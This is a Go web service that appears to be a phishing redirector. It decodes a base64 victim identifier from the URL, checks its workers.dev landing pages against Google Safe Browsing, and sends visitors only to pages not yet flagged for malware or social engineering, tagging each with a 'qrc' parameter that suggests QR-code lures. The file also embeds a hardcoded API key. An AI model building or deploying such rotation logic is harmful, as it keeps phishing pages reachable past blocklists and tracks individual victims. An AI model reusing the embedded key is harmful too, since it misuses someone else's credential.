package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"slices"

	"github.com/gofiber/fiber/v2"
)

var urls = []string{
	"https://e6cf7604.8d10a99115b808deb3bfc166.workers.dev",
	// Add more URLs here
}

func main() {
	app := fiber.New()

	app.Get("/:userID", func(c *fiber.Ctx) error {
		var (
			flaggedUrls = checkFlaggedUrls(urls)
			url         = getRandomUrl(urls, flaggedUrls)

			userID        = c.Params("userID")
			decodedUserID = decode(userID)
		)

		newDestination := url + "?qrc=" + decodedUserID
		return c.Redirect(newDestination)
	})

	app.Listen(":80")
}

func decode(data string) string {
	if isBase64(data) {
		dataByte, _ := base64.StdEncoding.DecodeString(data)
		return string(dataByte)
	}
	return data
}

func isBase64(s string) bool {
	_, err := base64.StdEncoding.DecodeString(s)
	return err == nil
}

func getRandomUrl(urls []string, flaggedUrls []string) string {
	filteredUrls := make([]string, 0)
	for _, url := range urls {
		if !slices.Contains(flaggedUrls, url) {
			filteredUrls = append(filteredUrls, url)
		}
	}

	return filteredUrls[rand.Intn(len(filteredUrls))]
}

func checkFlaggedUrls(urls []string) []string {
	safeBrowsingAPIKey := "AIzaSyDY9kelfaWRlaapd3f_D7hdzsp_asVcDt8"
	lookupURL := fmt.Sprintf("https://safebrowsing.googleapis.com/v4/threatMatches:find?key=%s", safeBrowsingAPIKey)

	payload := map[string]interface{}{
		"client": map[string]string{
			"clientId":      "",
			"clientVersion": "1.0",
		},
		"threatInfo": map[string]interface{}{
			"threatTypes": []string{
				"MALWARE",
				"SOCIAL_ENGINEERING",
				"UNWANTED_SOFTWARE",
				"POTENTIALLY_HARMFUL_APPLICATION",
			},
			"platformTypes":    []string{"ANY_PLATFORM"},
			"threatEntryTypes": []string{"URL"},
			"threatEntries":    []map[string]string{},
		},
	}

	for _, url := range urls {
		payload["threatInfo"].(map[string]interface{})["threatEntries"] = append(payload["threatInfo"].(map[string]interface{})["threatEntries"].([]map[string]string), map[string]string{"url": url})
	}

	jsonPayload, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", lookupURL, bytes.NewBuffer(jsonPayload))
	if err != nil {
		panic(err) // Handle errors appropriately in production
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err) // Handle errors appropriately in production
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		panic(err) // Handle errors appropriately in production
	}

	var flaggedUrls []string
	if matches, ok := result["matches"]; ok {
		for _, match := range matches.([]interface{}) {
			flaggedUrls = append(flaggedUrls, match.(map[string]interface{})["threat"].(map[string]interface{})["url"].(string))
		}
	}

	return flaggedUrls
}
